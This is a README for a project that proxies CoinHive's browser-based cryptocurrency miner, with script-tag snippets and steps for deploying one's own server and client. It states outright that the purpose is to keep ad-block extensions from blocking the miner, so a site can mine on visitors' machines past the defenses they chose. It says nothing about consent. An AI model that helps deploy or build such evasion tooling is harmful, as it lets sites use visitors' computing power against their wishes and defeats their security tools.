Coin-Hive Proxy
---------------

This is a simple proxy for [CoinHive](https://coinhive.com)'s client and websocket server.

## Disclaimer

This project is not endorsed by or affiliated with `coinhive.com` in any way.

## Usage

Instead of embedding CoinHive's [JavaScript Miner](https://coinhive.com/documentation/miner), which would be something like this:

```html
<script src="https://coinhive.com/lib/coinhive.min.js"></script>
```

You can embed this proxy:

```html
<script src="https://cazala.github.io/coin-hive-proxy/client.js?coin-hive-proxy=coin-hive-proxy-ybydcnjgkl.now.sh"></script>
```

And it will work in the same way.

## Why?

Ad-blockers

## Create your own

You can create your own client and/or server proxies just doing the following:

### Server

Just deploy this repo to `now.sh`

[![Deploy to now](https://deploy.now.sh/static/button.svg)](https://deploy.now.sh/?repo=https://github.com/cazala/coin-hive-proxy)

This will deploy a proxy instance to your `now.sh` account, and it will give you a url like this: `coin-hive-proxy-ybydcnjgkl.now.sh`.

This is **YOUR-SERVER-URL**

### Client

Just fork this repo, and create a branch named `gh-pages`.

This will create a github page under you github's account with the `client.js` file.

After that you will be able to access the client via `https://<YOUR-GITHUB-USERNAME>.github.io/coin-hive-proxy/client.js`

This is your **YOUR-CLIENT-URL**

### Use it

Now you can use the following script tag instead of CoinHive's to avoid being blocked by an ad-block extension:

```html
<script src="YOUR-CLIENT-URL?coin-hive-proxy=YOUR-SERVER-URL"></script>
```

It should look like [the one above](https://github.com/cazala/coin-hive-proxy#usage).
